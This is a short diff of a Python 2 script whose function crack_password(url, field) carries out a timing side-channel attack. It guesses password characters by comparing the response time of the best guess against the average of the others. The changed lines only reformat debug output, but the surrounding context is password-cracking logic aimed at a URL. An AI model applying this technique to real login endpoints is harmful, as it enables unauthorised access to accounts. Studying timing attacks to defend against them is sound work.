@@ -54,17 +54,17 @@ def crack_password(url, field):
         best_guess = sorted_guesses[0]
         best_guess_char = best_guess[0][-2]
         best_guess_time = best_guess[1]
-        print "           best_guess_time =", best_guess_time
+        print "                best_guess =", best_guess_char, "@", best_guess_time
 
         # get the average time for all other entries in the list
         rest_guesses = sorted_guesses[1:]
         rest_guesses_times = [rest_guess[1] for rest_guess in rest_guesses]
         average_rest_guesses_times = reduce(operator.add, rest_guesses_times) / len(rest_guesses_times)
-        print "average_rest_guesses_times =", average_rest_guesses_times
+        print "average_rest_guesses_times =    ", average_rest_guesses_times
 
         # calculate average time to compare a single character
         slope = best_guess_time - average_rest_guesses_times
-        print "                     slope =", slope
+        print "                     slope =    ", slope
 
         # debounce (helpful with jitter caused by comms)
         if best_guess_char != last_best_guess_char:
